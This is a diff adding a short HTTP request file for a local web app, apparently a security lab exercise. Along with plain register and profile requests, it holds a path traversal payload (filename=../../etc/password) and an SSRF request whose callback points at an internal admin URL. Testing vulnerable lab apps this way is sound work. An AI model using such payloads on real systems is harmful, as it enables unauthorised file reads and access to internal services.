@@ -1,0 +1,36 @@
+# Information Disclosure 1
+### register 1
+POST http://localhost:7000/register?userId=1&userName=aboba1
+Content-Type: application/json
+Accept: application/json
+
+### register 2
+POST http://localhost:7000/register?userId=2&userName=aboba2
+Content-Type: application/json
+Accept: application/json
+
+### profile 1
+GET http://localhost:7000/userProfile?userId=1
+Content-Type: application/json
+Accept: application/json
+
+### profile 2
+GET http://localhost:7000/userProfile?userId=2
+Content-Type: application/json
+Accept: application/json
+
+### Path traversal + DDos
+GET http://localhost:7000/exportReport?userId=1&filename=../../etc/password
+Accept: application/json
+
+### SSRF
+POST http://localhost:7000/notify?userId=1&callbackUrl=http://localhost:8080/admin
+Content-Type: application/json
+Accept: application/json
+
+
+
+
+
+
+
